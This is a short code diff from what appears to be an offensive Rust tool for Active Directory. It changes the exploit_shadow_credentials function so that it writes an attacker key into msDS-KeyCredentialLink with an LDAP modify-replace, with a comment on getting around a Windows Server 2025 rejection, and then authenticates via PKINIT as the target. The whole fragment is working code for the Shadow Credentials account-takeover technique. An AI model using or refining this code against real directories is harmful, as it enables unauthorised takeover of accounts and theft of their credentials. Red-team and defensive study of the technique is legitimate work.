@@ -127,16 +127,23 @@ pub async fn exploit_shadow_credentials(
     let key_cred_dn_binary = build_key_credential_dn_binary(&cert_der, target_dn)?;
 
     info!(
-        "Shadow Credentials: Writing msDS-KeyCredentialLink to {target_dn} ({} chars)",
+        "Shadow Credentials: Writing msDS-KeyCredentialLink to {target_dn} ({} chars via modify-replace)",
         key_cred_dn_binary.len()
     );
-    ldap.modify_add(target_dn, "msDS-KeyCredentialLink", &[key_cred_dn_binary])
-        .await
-        .map_err(|e| {
-            OverthroneError::Custom(format!(
-                "Shadow Credentials: Failed to write KeyCredentialLink: {e}"
-            ))
-        })?;
+    // Use modify-replace (not modify-add) because the target likely has no existing
+    // KeyCredentialLink value. WS2025 rejects modify-add on an empty attribute with
+    // rc=21 (LDAP_INSUFFICIENT_ACCESS_RIGHTS). Certipy uses MODIFY_REPLACE.
+    ldap.modify_replace(
+        target_dn,
+        "msDS-KeyCredentialLink",
+        key_cred_dn_binary.as_bytes(),
+    )
+    .await
+    .map_err(|e| {
+        OverthroneError::Custom(format!(
+            "Shadow Credentials: Failed to write KeyCredentialLink: {e}"
+        ))
+    })?;
 
     info!("Shadow Credentials: Authenticating via PKINIT as {target_dn}");
     let pkinit_cfg = PkinitConfig {
